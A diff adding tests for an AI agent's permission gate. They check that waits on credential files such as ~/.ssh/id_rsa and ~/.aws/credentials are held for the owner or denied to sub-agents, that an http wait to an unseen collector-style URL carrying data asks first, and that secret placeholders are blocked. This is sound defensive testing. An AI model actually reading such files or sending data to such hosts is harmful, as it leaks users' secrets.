@@ -138,3 +138,46 @@ test("a stored call is marked as the gate would judge it: a schedule is a change
   expect(cls("notify")).toBe("control");
   expect(cls("schedule_list")).toBe("read");
 });
+
+// What a wait reads is judged as the read it is: the tool is the session's own act, its target is the file or address.
+const pending = async (g: Gate) => { for (let n = 0; n < 40 && !g.approvals({ pending: true }).length; n++) await Bun.sleep(5); return g.approvals({ pending: true }).length; };
+
+test("a file or log wait on a credential file asks the owner and is refused to an agent, as a read of it would be", async () => {
+  for (const [name, input] of [["wait_for", { kind: "file", path: "~/.ssh/id_rsa", contains: "BEGIN" }], ["WaitFor", { kind: "log", path: "~/.aws/credentials", match: "x" }], ["wait_for", { spec: { kind: "file", path: "~/.ssh/id_rsa" } }]] as const) {
+    for (const mode of ["read-only", "ask", "auto-edits"] as const) {
+      const owner = scratch();
+      owner.g.setPerm("s1", { mode, sandbox: "off" });
+      const stop = new AbortController();
+      const held = owner.g.check(owner.session, owner.call(tool(name), input, stop));
+      expect([name, mode, await pending(owner.g)]).toEqual([name, mode, 1]);
+      stop.abort();
+      await held;
+      const agent = scratch();
+      agent.g.setPerm("s1", { mode, sandbox: "off" });
+      expect([name, mode, "deny" in (await agent.g.check({ ...agent.session, parent_id: "p" } as Session, agent.call(tool(name), input)))]).toEqual([name, mode, true]);
+    }
+  }
+  // A wait on an ordinary file, a timer or a process reads nothing a mode guards.
+  const { g, session, call } = scratch();
+  g.setPerm("s1", { mode: "read-only", sandbox: "off" });
+  for (const input of [{ kind: "timer", seconds: 5 }, { kind: "file", path: join(session.workspace, "done") }]) expect(await g.check(session, call(tool("wait_for"), input))).not.toHaveProperty("deny");
+});
+
+test("an http wait to an address the session has not seen asks, as a page fetch would", async () => {
+  const { g, session, call } = scratch();
+  g.setPerm("s1", { mode: "ask", sandbox: "off" });
+  const stop = new AbortController();
+  const held = g.check(session, call(tool("wait_for"), { kind: "http", url: "https://collector.example.net/ping?d=abc123def456" }, stop));
+  expect(await pending(g)).toBe(1);
+  stop.abort();
+  await held;
+});
+
+test("a placeholder for a secret in the input of the session's own act is not reviewed in Auto", async () => {
+  const { g, session, reviewed, call } = scratch();
+  g.setPerm("s1", { mode: "auto", sandbox: "off" });
+  const ref = "[value of $" + "FIXTURE_SINK]";
+  const r = await g.check(session, call(tool("notify"), { text: `key ${ref}` }));
+  expect(r).toHaveProperty("deny", expect.stringContaining("secret"));
+  expect(reviewed).toEqual([]);
+});
